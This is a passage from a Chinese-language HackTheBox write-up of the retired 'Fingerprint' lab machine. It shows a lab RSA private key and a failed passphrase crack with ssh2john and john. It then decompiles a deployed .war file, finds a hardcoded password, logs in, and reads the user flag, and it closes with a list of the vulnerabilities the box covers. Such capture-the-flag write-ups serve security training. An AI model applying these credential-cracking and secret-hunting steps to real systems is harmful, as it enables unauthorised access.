class="hljs-regexp">/DgbsfNxf3sHAl8snIiBwgEmb8Ep6CJOIQbuaPzqa2/</span>Lxt<br>FWZlHwYGnieVxX67nNdcU+<span class="hljs-number">3</span>xdfXbJX8UpYuGkKGwSiZRDHb3sMN5CtfHhU0fNybG<br><span class="hljs-number">5</span>xHn1YTwMZwHf8dKijdevMG2a8D79oaPff0XNflP+M2oz6e8RPOmkI0Wkv9EIq9X<br>IbLprBGDM8VQDHtO76u+l4DQZbMFCjCSjm+/xVtPmkCB7YhOyMOd5GqymGhxlbaS<br>OYJUBjA0TxHLtJ5+<span class="hljs-number">5</span>rptyaIwnJ82CA0jjRI3hoGfk2PAkX9LJuonnRm3/Is2u02R<br>GoYnpegyKTp5ETL1Ut5BdEle1HrCTY5EjzI+e7bwXIEVhvgwS8e6W3ZUq72CC+gb<br>PkSbQSQXQDQ3<span class="hljs-regexp">/qEN0XkpFIa7gyB/</span>GTKtlEwUSv<span class="hljs-regexp">/GxyB7lxu314/</span>Nox7Bz32sxxsc<br>EwZURAAynFhVP+Bd7eB<span class="hljs-regexp">/ws/</span>Ii2N9ENKk8ut8+<span class="hljs-number">9</span>fKFw4/<span class="hljs-number">1</span>pJDdwuof8MgdPImmEXZ<br>MPrQyMbt<span class="hljs-regexp">/7g1oAskxy3XgeuuRY76HN/</span>p2tElyBDZ4K+XWikKAnQPNkaohfjqsTJX<br>VqPsWG2f8XxMnN6gRvWQ7eibbARdFU7c0KR3ANWgQ06ysCYp+R8F4ns4+nZzp2x1<br>DJpbS55UpW9r3cjcHHjfAoEmtI80waMKMpnTmwWyPqFGQiCVJvQkQBWKpmT/W8hU<br>dexiRjth+FOMmrUcFe1sSElNFHDcKj2TKxdPW97c<span class="hljs-regexp">/afLn3E/</span>dUFDzalntY7K4A5M<br>O0F1a7M71yqaTsTEBglt1ZfVJUdogpz5rp2i77H5<span class="hljs-regexp">/gHV1/g</span>IEwLwLkUchsFpS2kC<br><span class="hljs-regexp">/ttPebUPv5Xxd/</span>qMF4c8+Qaynn9+MAnbDPz7peYH2un2n103qI4PudCjdpGW23sb<br>UOtc0lgU4S2pA8rWT3j69nesVzR6Yni5zzj2gUL6o12+jdLoGYH6x6unlSf+EnEc<br>U1jQBBJReZQ82j+e1FhxvD6WclxpNrtZxZdSyYaaLOMyI618tvvn5X63AWoNAZoT<br>sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE<br>U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv<br>-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>

<p>但是使用该文件在登录时提示需要私钥文件的密码。</p>
<h2 id="爆破（失败）"><a href="#爆破（失败）" class="headerlink" title="爆破（失败）"></a>爆破（失败）</h2><p>我们可以先试试爆破。首先是<code>hashcat</code>本身是不支持爆破ssh私钥密码的，但是<code>john</code>可以。我们可以使用<code>ssh2john</code>这个脚本帮助我们将私钥文件转换成<code>john</code>支持的<code>hash</code>。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➤  ssh2john<span class="hljs-selector-class">.py</span> id_rsa &gt; id_rsa<span class="hljs-selector-class">.hash</span> <br></code></pre></td></tr></table></figure>

<p>但是并没有爆破成功：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➤  john id_rsa.hash <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">1</span> (KDF/cipher [<span class="hljs-number">0</span>=MD5/AES <span class="hljs-number">1</span>=MD5/<span class="hljs-number">3</span>DES <span class="hljs-number">2</span>=Bcrypt/AES]) <span class="hljs-keyword">is</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">2</span> (iteration count) <span class="hljs-keyword">is</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">0</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span> DONE (<span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-04</span> <span class="hljs-number">17</span>:<span class="hljs-number">02</span>) <span class="hljs-number">0</span>g/s <span class="hljs-number">4717</span>Kp/s <span class="hljs-number">4717</span>Kc/s <span class="hljs-number">4717</span>KC/s *<span class="hljs-number">7</span>¡Vamos!<br><span class="hljs-keyword">Session</span> completed.<br></code></pre></td></tr></table></figure>

<h2 id="解包-amp-搜索"><a href="#解包-amp-搜索" class="headerlink" title="解包&amp;搜索"></a>解包&amp;搜索</h2><p>在接着使用之前找到的一些密码无果后，我将目光投向了部署网站的<code>war</code>文件。</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">www-data@fingerprint:<span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>config$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -name *.war 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>lib<span class="hljs-regexp">/install/</span>applications<span class="hljs-regexp">/metro/</span>wstx-services.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>lib<span class="hljs-regexp">/install/</span>applications/ejb-timer-service-app.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>applications<span class="hljs-regexp">/__internal/</span>app/app.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqums.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqhttp.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqhttps.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/javadb/</span>lib/derby.war<br></code></pre></td></tr></table></figure>

<p>将app.war拖下来，解包后将整个文件夹导入<code>jd-gui</code>分析，全盘搜索password等关键字后在<code>HibernateUtil.class</code>文件中找到了一个密码<code>q9Patz64fhtiVSO6Df2K</code>。</p>
<p><img src="/img/Fingerprint.assets/image-20220529220324228.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220529220324228"></p>
<p>使用这个密码我们能够成功登录进john：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">john<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt<br><span class="hljs-number">82</span>b92c5ae7a77e4e586a14275f259345<br>john<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:~</span>$<br></code></pre></td></tr></table></figure>



<h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>靶场retired了。。做不得</p>
<h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Insane难度的Linux靶机，主要考察内容如下：</p>
<ul>
<li>不严谨的302跳转的利用</li>
<li>路径穿越漏洞</li>
<li>HQL注入</li>
<li>XSS</li>
<li>Json Web Token</li>
<li>Java代码审计</li>
<li>反序列化利用</li>
<li>滥用二进制文件</li>
<li>war包分析</li>
</ul>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Web/" class="category-chain-item">Web</a>
  
  
    <span>></span>
    
  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
  
  
    <span>></span>
    
  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
  
  

  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/HackTheBox/">#HackTheBox</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HackTheBox - Fingerprint</div>
      <div>https://m0ck1ng-b1rd.github.io/2022/06/06/HTB/Fingerprint/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>何语灵</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年6月6日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/05/27/HTB/Pandora/" title="HackTheBox - Pandora">
                        <span class="hidden-mobile">HackTheBox - Pandora</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div>Per aspera ad astra</div> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  

  

  

  

  

  

  
    
  




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="/js/leancloud.js" ></script>




  
<script src="//picbedddd.oss-cn-beijing.aliyuncs.com/blog/scripts/DynamicRibbon.min.js"></script>
<script src="//picbedddd.oss-cn-beijing.aliyuncs.com/blog/scripts/star.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
</html>
